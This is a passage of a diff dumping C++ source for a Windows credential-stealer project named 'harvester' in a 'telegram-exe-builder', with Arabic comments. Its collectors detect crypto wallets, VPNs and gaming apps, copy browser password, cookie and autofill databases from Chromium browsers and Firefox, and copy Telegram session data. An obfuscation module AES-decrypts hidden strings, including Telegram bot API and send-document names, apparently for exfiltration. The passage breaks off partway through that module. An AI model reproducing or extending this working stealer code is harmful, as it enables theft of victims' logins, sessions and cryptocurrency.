+static const unsigned char OBF_STR_138[16] = {0xf0, 0x49, 0x4f, 0x4d, 0x92, 0x20, 0x5c, 0x2b, 0x83, 0x29, 0x1d, 0xd4, 0x1d, 0xf7, 0x5e, 0x48};
+static const size_t OBF_STR_138_LEN = 16;
+
+static const unsigned char OBF_STR_139[16] = {0xbf, 0x13, 0xbb, 0x16, 0x00, 0x34, 0xd8, 0x28, 0x66, 0x40, 0x2b, 0xdc, 0x35, 0xda, 0x87, 0xb4};
+static const size_t OBF_STR_139_LEN = 16;
+
+// end of file
+
+
+================================================================================
+FILE: harvester\collectors\app_detector.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\app_detector.cpp
+================================================================================
+// harvester/collectors/app_detector.cpp
+#include "app_detector.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <shlobj.h>
+#include <tlhelp32.h>
+#include <string>
+#include <vector>
+#include <fstream>
+#include <algorithm>
+
+// قائمة المعرفات (معرفات السلاسل المشفرة) للتطبيقات المستهدفة
+std::vector<int> GetTargetAppIDs() {
+    return {
+        STR_DISCORD,
+        STR_VIBER,
+        STR_TLAUNCHER,
+        STR_STEAM,
+        STR_BLUESTACKS,
+        STR_EXODUS,
+        STR_ATOMIC,
+        STR_ELECTRUM,
+        STR_GUARDA,
+        STR_COINOMI,
+        STR_METAMASK,
+        STR_COINBASE_WALLET,
+        STR_BINANCE_WALLET,
+        STR_PHANTOM,
+        STR_RONIN,
+        STR_TRONLINK,
+        STR_TRUST_WALLET,
+        STR_OPENVPN,
+        STR_NORDVPN,
+        STR_PROTONVPN
+    };
+}
+
+// دالة مساعدة للبحث عن مجلد تثبيت تطبيق (فحص عدة مسارات شائعة)
+static std::string FindAppInstallPath(const std::string& appName, const std::vector<std::string>& possiblePaths) {
+    for (const auto& basePath : possiblePaths) {
+        std::string fullPath = basePath + "\\" + appName;
+        DWORD attrs = GetFileAttributesA(fullPath.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+            return fullPath;
+        }
+        // أيضاً نبحث عن المجلد بدون إضافة اسم التطبيق (مثل "Discord" قد يكون مباشرة في Program Files)
+        std::string directPath = basePath + "\\" + appName;
+        attrs = GetFileAttributesA(directPath.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+            return directPath;
+        }
+    }
+    return "";
+}
+
+// التحقق من وجود عملية جارية باسم معين
+static bool IsProcessRunning(const std::string& exeName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            if (_stricmp(pe.szExeFile, exeName.c_str()) == 0) {
+                CloseHandle(hSnapshot);
+                return true;
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    return false;
+}
+
+// الكشف عن التطبيقات
+std::vector<DetectedApp> DetectTargetedApps() {
+    std::vector<DetectedApp> results;
+    auto appIDs = GetTargetAppIDs();
+    
+    // المسارات الأساسية للبحث
+    char programFiles[MAX_PATH];
+    char programFilesX86[MAX_PATH];
+    char appData[MAX_PATH];
+    char localAppData[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFiles);
+    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, programFilesX86);
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
+    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
+    
+    std::vector<std::string> basePaths = { programFiles, programFilesX86, appData, localAppData };
+    
+    for (int id : appIDs) {
+        std::string appName = GetObfuscatedString(id);
+        DetectedApp app;
+        app.name = appName;
+        app.found = false;
+        
+        // مسارات خاصة لبعض التطبيقات
+        if (id == STR_DISCORD) {
+            // Discord عادة في LocalAppData
+            std::string discordPath = std::string(localAppData) + "\\Discord";
+            if (GetFileAttributesA(discordPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else if (IsProcessRunning("Discord.exe"))
+                app.found = true;
+        }
+        else if (id == STR_VIBER) {
+            std::string viberPath = std::string(appData) + "\\ViberPC";
+            if (GetFileAttributesA(viberPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else if (IsProcessRunning("Viber.exe"))
+                app.found = true;
+        }
+        else if (id == STR_TLAUNCHER) {
+            std::string tlauncherPath = std::string(appData) + "\\.tlauncher";
+            if (GetFileAttributesA(tlauncherPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+        }
+        else if (id == STR_STEAM) {
+            std::string steamPath = std::string(programFilesX86) + "\\Steam";
+            if (GetFileAttributesA(steamPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else if (IsProcessRunning("Steam.exe"))
+                app.found = true;
+        }
+        else if (id == STR_BLUESTACKS) {
+            std::string bsPath = std::string(programFiles) + "\\BlueStacks";
+            if (GetFileAttributesA(bsPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else if (IsProcessRunning("HD-Player.exe"))
+                app.found = true;
+        }
+        else if (id == STR_EXODUS || id == STR_ATOMIC || id == STR_ELECTRUM || id == STR_GUARDA || id == STR_COINOMI) {
+            // محافظ سطح المكتب غالباً في AppData أو Program Files
+            std::string walletPath = std::string(appData) + "\\" + appName;
+            if (GetFileAttributesA(walletPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else {
+                // البحث في Program Files
+                walletPath = std::string(programFiles) + "\\" + appName;
+                if (GetFileAttributesA(walletPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                    app.found = true;
+            }
+        }
+        else if (id >= STR_METAMASK && id <= STR_TRUST_WALLET) {
+            // امتدادات المتصفح – سنكتشفها لاحقاً من ملفات المتصفحات (Extensions)
+            // نتركها كـ false حالياً، يمكن تحديث لاحقاً
+            app.found = false;
+        }
+        else if (id == STR_OPENVPN || id == STR_NORDVPN || id == STR_PROTONVPN) {
+            std::string vpnPath = std::string(programFiles) + "\\" + appName;
+            if (GetFileAttributesA(vpnPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                app.found = true;
+            else if (IsProcessRunning(appName + ".exe"))
+                app.found = true;
+        }
+        else {
+            // بحث عام في المسارات
+            for (const auto& base : basePaths) {
+                std::string testPath = base + "\\" + appName;
+                if (GetFileAttributesA(testPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                    app.found = true;
+                    break;
+                }
+            }
+            // أيضاً نتحقق من العملية
+            if (!app.found && IsProcessRunning(appName + ".exe"))
+                app.found = true;
+        }
+        
+        results.push_back(app);
+    }
+    return results;
+}
+
+void SaveDetectedAppsToFile(const std::vector<DetectedApp>& apps, const std::string& outputDir) {
+    std::string filePath = outputDir + "\\" + GetObfuscatedString(STR_DETECTED_APPS); // "detected_apps.txt"
+    std::ofstream out(filePath);
+    if (!out.is_open()) return;
+    
+    out << GetObfuscatedString(STR_GRABBED_SOFTWARE) << ":" << std::endl;
+    for (const auto& app : apps) {
+        out << (app.found ? "[x] " : "[ ] ") << app.name << std::endl;
+    }
+    out.close();
+}
+
+================================================================================
+FILE: harvester\collectors\app_detector.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\app_detector.h
+================================================================================
+// harvester/collectors/app_detector.h
+#pragma once
+
+#include <string>
+#include <vector>
+
+// بنية لتخزين نتيجة الكشف عن تطبيق
+struct DetectedApp {
+    std::string name;      // اسم التطبيق (مثل "Discord")
+    bool found;            // هل تم العثور عليه؟
+    std::string path;      // مسار التثبيت (إذا وجد)
+};
+
+// قائمة بجميع التطبيقات المستهدفة (يعيد أسماء المعرفات)
+std::vector<int> GetTargetAppIDs();
+
+// يكتشف وجود التطبيقات ويعيد قائمة بـ DetectedApp
+std::vector<DetectedApp> DetectTargetedApps();
+
+// يحفظ قائمة التطبيقات المكتشفة في ملف نصي (detected_apps.txt) مع علامات [x]
+void SaveDetectedAppsToFile(const std::vector<DetectedApp>& apps, const std::string& outputDir);
+
+================================================================================
+FILE: harvester\collectors\browser_collector.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\browser_collector.cpp
+================================================================================
+// browser_collector.cpp – نسخة معتمدة كلياً على GetObfuscatedString
+#include "browser_collector.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <shlobj.h>
+#include <string>
+#include <vector>
+
+// دوال مساعدة (مثل CreateDirRecursive, CopySingleFile) – لا تحتوي على نصوص حساسة
+static void CreateDirRecursive(const std::string& path) {
+    char tmp[MAX_PATH];
+    snprintf(tmp, sizeof(tmp), "%s", path.c_str());
+    for (char* p = tmp + 1; *p; p++) {
+        if (*p == '\\' || *p == '/') {
+            *p = 0;
+            CreateDirectoryA(tmp, NULL);
+            *p = '\\';
+        }
+    }
+    CreateDirectoryA(tmp, NULL);
+}
+
+static bool CopySingleFile(const std::string& src, const std::string& dst) {
+    return CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
+}
+
+static void CopyFolderRecursive(const std::string& srcDir, const std::string& dstDir) {
+    CreateDirRecursive(dstDir);
+    std::string search = srcDir + "\\*";
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        std::string name = fd.cFileName;
+        if (name != "." && name != "..") {
+            std::string srcPath = srcDir + "\\" + name;
+            std::string dstPath = dstDir + "\\" + name;
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                CopyFolderRecursive(srcPath, dstPath);
+            } else {
+                CopySingleFile(srcPath, dstPath);
+            }
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+}
+
+static void CopyChromiumProfile(const std::string& profilePath, const std::string& browserName, const std::string& outputDir) {
+    std::string destBase = outputDir + "\\browsers\\" + browserName;
+    CreateDirRecursive(destBase);
+    
+    // الملفات المهمة: Local State, Login Data, Cookies, Web Data
+    int fileIDs[] = {STR_LOCAL_STATE, STR_LOGIN_DATA, STR_COOKIES, STR_WEB_DATA};
+    for (int fid : fileIDs) {
+        std::string fileName = GetObfuscatedString(fid);
+        std::string src = profilePath + "\\" + fileName;
+        std::string dst = destBase + "\\" + fileName;
+        DWORD attrs = GetFileAttributesA(src.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+            CopySingleFile(src, dst);
+        }
+    }
+    
+    // نسخ مجلد Extensions
+    std::string extensionsSrc = profilePath + "\\Extensions";
+    DWORD attrs = GetFileAttributesA(extensionsSrc.c_str());
+    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+        std::string extensionsDst = destBase + "\\Extensions";
+        CopyFolderRecursive(extensionsSrc, extensionsDst);
+    }
+}
+
+void CollectBrowsersData(const std::string& outputDir) {
+    char localAppData[MAX_PATH];
+    char appData[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
+    
+    // قائمة المتصفحات (أسماء ومسارات) – كلها من السلاسل المشفرة
+    struct BrowserInfo {
+        int nameID;
+        int pathID;
+    };
+    
+    BrowserInfo browsers[] = {
+        {STR_CHROME,      STR_CHROME_DATA},
+        {STR_EDGE,        STR_EDGE_DATA},
+        {STR_BRAVE,       STR_BRAVE_DATA},
+        {STR_OPERA,       STR_OPERA_DATA},
+        {STR_VIVALDI,     STR_VIVALDI_DATA},
+        {STR_SAFARI,      STR_SAFARI_DATA},      // Safari on Windows (مجلد نادر)
+        {STR_TOR_BROWSER, STR_TOR_DATA},
+        {STR_CHROMIUM,    STR_CHROMIUM_DATA},
+        {STR_EPIC,        STR_EPIC_DATA},
+        {STR_OPERA_GX,    STR_OPERA_GX_DATA}
+    };
+    
+    for (const auto& browser : browsers) {
+        std::string browserName = GetObfuscatedString(browser.nameID);
+        std::string browserPath = GetObfuscatedString(browser.pathID);
+        std::string fullPath = std::string(localAppData) + "\\" + browserPath;
+        
+        DWORD attrs = GetFileAttributesA(fullPath.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::string defaultProfile = fullPath + "\\Default";
+            DWORD attrs2 = GetFileAttributesA(defaultProfile.c_str());
+            if (attrs2 != INVALID_FILE_ATTRIBUTES && (attrs2 & FILE_ATTRIBUTE_DIRECTORY)) {
+                CopyChromiumProfile(defaultProfile, browserName, outputDir);
+            }
+        }
+    }
+    
+    // Firefox: مسار مختلف
+    std::string firefoxProfiles = std::string(appData) + "\\" + GetObfuscatedString(STR_FIREFOX_PROFILES);
+    DWORD attrs = GetFileAttributesA(firefoxProfiles.c_str());
+    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+        std::string search = firefoxProfiles + "\\*";
+        WIN32_FIND_DATAA fd;
+        HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    std::string profileName = fd.cFileName;
+                    if (profileName != "." && profileName != "..") {
+                        std::string srcProfile = firefoxProfiles + "\\" + profileName;
+                        std::string destProfile = outputDir + "\\browsers\\Firefox\\" + profileName;
+                        CreateDirRecursive(destProfile);
+                        
+                        // ملفات Firefox الثلاثة
+                        int ffFileIDs[] = {STR_KEY4_DB, STR_LOGINS_JSON, STR_COOKIES_SQLITE};
+                        for (int fid : ffFileIDs) {
+                            std::string fileName = GetObfuscatedString(fid);
+                            std::string srcFile = srcProfile + "\\" + fileName;
+                            std::string dstFile = destProfile + "\\" + fileName;
+                            DWORD att = GetFileAttributesA(srcFile.c_str());
+                            if (att != INVALID_FILE_ATTRIBUTES && !(att & FILE_ATTRIBUTE_DIRECTORY)) {
+                                CopySingleFile(srcFile, dstFile);
+                            }
+                        }
+                    }
+                }
+            } while (FindNextFileA(hFind, &fd));
+            FindClose(hFind);
+        }
+    }
+}
+
+================================================================================
+FILE: harvester\collectors\browser_collector.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\browser_collector.h
+================================================================================
+// browser_collector.h
+#pragma once
+#include <string>
+
+// ينسخ ملفات تعريف المتصفحات (cookies, logins, etc) من Chrome, Edge, Brave, Firefox
+void CollectBrowsersData(const std::string& outputDir);
+
+================================================================================
+FILE: harvester\collectors\telegram_collector.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\telegram_collector.cpp
+================================================================================
+// telegram_collector.cpp – نسخة معتمدة كلياً على GetObfuscatedString
+#include "telegram_collector.h"
+#include "../crypto/obfuscation.h"
+#include <windows.h>
+#include <shlobj.h>
+#include <tlhelp32.h>
+#include <string>
+#include <vector>
+#include <cctype>
+
+// دوال مساعدة (لا تحتوي على نصوص حساسة)
+static bool IsHexFolder(const std::string& name) {
+    if (name.size() != 16) return false;
+    for (char c : name) {
+        if (!isxdigit(static_cast<unsigned char>(c))) return false;
+    }
+    return true;
+}
+
+static void CreateDirRecursive(const std::string& path) {
+    char tmp[MAX_PATH];
+    snprintf(tmp, sizeof(tmp), "%s", path.c_str());
+    for (char* p = tmp + 1; *p; p++) {
+        if (*p == '\\' || *p == '/') {
+            *p = 0;
+            CreateDirectoryA(tmp, NULL);
+            *p = '\\';
+        }
+    }
+    CreateDirectoryA(tmp, NULL);
+}
+
+static bool CopySingleFile(const std::string& src, const std::string& dst) {
+    return CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
+}
+
+// نسخ الملفات التي تطابق نمطاً معيناً في المجلد (filter إما "key_datas" أو "map")
+static void CopyFilteredFiles(const std::string& srcDir, const std::string& dstDir, int filterID) {
+    std::string filter = GetObfuscatedString(filterID);  // إما "key_datas" أو "map"
+    std::string search = srcDir + "\\*";
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::string fname = fd.cFileName;
+            if (filter == "key_datas" && fname == "key_datas") {
+                std::string srcFile = srcDir + "\\" + fname;
+                std::string dstFile = dstDir + "\\" + fname;
+                CopySingleFile(srcFile, dstFile);
+            }
+            else if (filter == "map" && fname.find("map") == 0) {
+                std::string srcFile = srcDir + "\\" + fname;
+                std::string dstFile = dstDir + "\\" + fname;
+                CopySingleFile(srcFile, dstFile);
+            }
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+}
+
+// نسخ مجلد جلسة كامل (المجلدات السداسية)
+static void CopySessionFolder(const std::string& srcSession, const std::string& dstSession) {
+    CreateDirRecursive(dstSession);
+    std::string search = srcSession + "\\*";
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+    do {
+        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            std::string srcFile = srcSession + "\\" + fd.cFileName;
+            std::string dstFile = dstSession + "\\" + fd.cFileName;
+            CopySingleFile(srcFile, dstFile);
+        }
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+}
+
+std::string FindTelegramTdata() {
+    std::vector<std::string> paths;
+    std::string tdataFolder = GetObfuscatedString(STR_TDATA);
+    std::string telegramDesktop = GetObfuscatedString(STR_TELEGRAM_DESKTOP);
+    
+    // المسار العادي %APPDATA%
+    char appdata[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
+        paths.push_back(std::string(appdata) + "\\" + telegramDesktop + "\\" + tdataFolder);
+    }
+    
+    // مسار UWP
+    char localappdata[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localappdata))) {
+        paths.push_back(std::string(localappdata) + "\\Packages\\Telegram.TelegramDesktop_t1g15s55y1sr8\\LocalCache\\Roaming\\" + telegramDesktop + "\\" + tdataFolder);
+    }
+    
+    // البحث عن عملية Telegram
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(hSnapshot, &pe)) {
+            do {
+                if (_stricmp(pe.szExeFile, "Telegram.exe") == 0) {
+                    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
+                    if (hProcess) {
+                        char path[MAX_PATH];
+                        DWORD size = MAX_PATH;
+                        if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
+                            std::string exePath(path);
+                            size_t pos = exePath.find_last_of("\\");
+                            if (pos != std::string::npos) {
+                                std::string exeDir = exePath.substr(0, pos);
+                                std::string tdataCandidate = exeDir + "\\" + tdataFolder;
+                                DWORD attrs = GetFileAttributesA(tdataCandidate.c_str());
+                                if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+                                    paths.push_back(tdataCandidate);
+                                }
+                            }
+                        }
+                        CloseHandle(hProcess);
+                    }
+                }
+            } while (Process32Next(hSnapshot, &pe));
+        }
+        CloseHandle(hSnapshot);
+    }
+    
+    for (const auto& p : paths) {
+        DWORD attrs = GetFileAttributesA(p.c_str());
+        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
+            return p;
+        }
+    }
+    return "";
+}
+
+bool CopyTelegramSession(const std::string& tdataPath, const std::string& outputDir) {
+    DWORD attrs = GetFileAttributesA(tdataPath.c_str());
+    if (attrs == INVALID_FILE_ATTRIBUTES || !(attrs & FILE_ATTRIBUTE_DIRECTORY)) return false;
+    
+    std::string outTdata = outputDir + "\\" + GetObfuscatedString(STR_TDATA);
+    CreateDirRecursive(outTdata);
+    
+    // نسخ key_datas و map*
+    CopyFilteredFiles(tdataPath, outTdata, STR_KEY_DATAS);
+    CopyFilteredFiles(tdataPath, outTdata, STR_MAP_PREFIX);
+    
+    // نسخ المجلدات السداسية (الجلسات)
+    std::string search = tdataPath + "\\*";
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                std::string dirName = fd.cFileName;
+                if (IsHexFolder(dirName)) {
+                    std::string srcSession = tdataPath + "\\" + dirName;
+                    std::string dstSession = outTdata + "\\" + dirName;
+                    CopySessionFolder(srcSession, dstSession);
+                }
+            }
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    return true;
+}
+
+================================================================================
+FILE: harvester\collectors\telegram_collector.h
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\collectors\telegram_collector.h
+================================================================================
+// telegram_collector.h
+#pragma once
+#include <string>
+
+// يبحث عن مسار tdata الحقيقي (تيليجرام عادي، محمول، أو UWP)
+std::string FindTelegramTdata();
+
+// ينسخ المجلد tdata بشكل ذكي (فقط key_datas, map*, والمجلدات السداسية)
+bool CopyTelegramSession(const std::string& tdataPath, const std::string& outputDir);
+
+================================================================================
+FILE: harvester\crypto\obfuscation.cpp
+PATH: c:\Users\RAHIM-KH\Desktop\LIDO\LIDO\Rahim\telegram-exe-builder-cpp\harvester\crypto\obfuscation.cpp
+================================================================================
+// harvester/crypto/obfuscation.cpp – نسخة نهائية تدعم المعرفات حتى 73
+#include "obfuscation.h"
+#include "../../generated_obfuscation.h"
+#include <windows.h>
+#include <wincrypt.h>
+#include <cstring>
+#include <vector>
+
+#pragma comment(lib, "crypt32.lib")
+
+std::string DecryptString(const std::vector<unsigned char>& cipher,
+                          const std::vector<unsigned char>& iv,
+                          const std::vector<unsigned char>& key) {
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
+        return "";
+    
+    struct AesBlob {
+        BLOBHEADER hdr;
+        DWORD keyLen;
+        BYTE keyBytes[32];
+    } blob;
+    blob.hdr.bType = PLAINTEXTKEYBLOB;
+    blob.hdr.bVersion = CUR_BLOB_VERSION;
+    blob.hdr.reserved = 0;
+    blob.hdr.aiKeyAlg = CALG_AES_256;
+    blob.keyLen = 32;
+    memcpy(blob.keyBytes, key.data(), 32);
+    
+    if (!CryptImportKey(hProv, (BYTE*)&blob, sizeof(blob), 0, 0, &hKey)) {
+        CryptReleaseContext(hProv, 0);
+        return "";
+    }
+    
+    std::vector<BYTE> data = cipher;
+    DWORD dataLen = (DWORD)data.size();
+    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0)) {
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+        return "";
+    }
+    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataLen)) {
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+        return "";
+    }
+    CryptDestroyKey(hKey);
+    CryptReleaseContext(hProv, 0);
+    
+    return std::string((char*)data.data(), dataLen);
+}
+
+std::string GetObfuscatedString(int id) {
+    std::vector<unsigned char> iv(OBF_IV, OBF_IV + sizeof(OBF_IV));
+    std::vector<unsigned char> key(OBF_KEY, OBF_KEY + sizeof(OBF_KEY));
+    
+    switch (id) {
+    case STR_TDATA: {
+        std::vector<unsigned char> cipher(OBF_STR_1, OBF_STR_1 + OBF_STR_1_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_TELEGRAM_DESKTOP: {
+        std::vector<unsigned char> cipher(OBF_STR_2, OBF_STR_2 + OBF_STR_2_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_API_TELEGRAM: {
+        std::vector<unsigned char> cipher(OBF_STR_3, OBF_STR_3 + OBF_STR_3_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BOT_TOKEN_PLACE: {
+        std::vector<unsigned char> cipher(OBF_STR_4, OBF_STR_4 + OBF_STR_4_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SEND_DOCUMENT: {
+        std::vector<unsigned char> cipher(OBF_STR_5, OBF_STR_5 + OBF_STR_5_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CHROME: {
+        std::vector<unsigned char> cipher(OBF_STR_6, OBF_STR_6 + OBF_STR_6_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_EDGE: {
+        std::vector<unsigned char> cipher(OBF_STR_7, OBF_STR_7 + OBF_STR_7_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BRAVE: {
+        std::vector<unsigned char> cipher(OBF_STR_8, OBF_STR_8 + OBF_STR_8_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_OPERA: {
+        std::vector<unsigned char> cipher(OBF_STR_9, OBF_STR_9 + OBF_STR_9_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VIVALDI: {
+        std::vector<unsigned char> cipher(OBF_STR_10, OBF_STR_10 + OBF_STR_10_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SAFARI: {
+        std::vector<unsigned char> cipher(OBF_STR_11, OBF_STR_11 + OBF_STR_11_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_TOR_BROWSER: {
+        std::vector<unsigned char> cipher(OBF_STR_12, OBF_STR_12 + OBF_STR_12_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CHROMIUM: {
+        std::vector<unsigned char> cipher(OBF_STR_13, OBF_STR_13 + OBF_STR_13_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_EPIC: {
+        std::vector<unsigned char> cipher(OBF_STR_14, OBF_STR_14 + OBF_STR_14_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_OPERA_GX: {
+        std::vector<unsigned char> cipher(OBF_STR_15, OBF_STR_15 + OBF_STR_15_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CHROME_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_16, OBF_STR_16 + OBF_STR_16_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_EDGE_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_17, OBF_STR_17 + OBF_STR_17_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_BRAVE_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_18, OBF_STR_18 + OBF_STR_18_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_OPERA_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_19, OBF_STR_19 + OBF_STR_19_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_VIVALDI_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_20, OBF_STR_20 + OBF_STR_20_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_SAFARI_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_21, OBF_STR_21 + OBF_STR_21_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_TOR_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_22, OBF_STR_22 + OBF_STR_22_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_CHROMIUM_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_23, OBF_STR_23 + OBF_STR_23_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_EPIC_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_24, OBF_STR_24 + OBF_STR_24_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_OPERA_GX_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_25, OBF_STR_25 + OBF_STR_25_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_LOCAL_STATE: {
+        std::vector<unsigned char> cipher(OBF_STR_26, OBF_STR_26 + OBF_STR_26_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_LOGIN_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_27, OBF_STR_27 + OBF_STR_27_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_COOKIES: {
+        std::vector<unsigned char> cipher(OBF_STR_28, OBF_STR_28 + OBF_STR_28_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_WEB_DATA: {
+        std::vector<unsigned char> cipher(OBF_STR_29, OBF_STR_29 + OBF_STR_29_LEN);
+        return DecryptString(cipher, iv, key);
+    }
+    case STR_FIREFOX_PROFILES: {
+        std::vector<unsigned char> cipher(OBF_STR_30, OBF_STR_30 + OBF_STR_30_LEN);
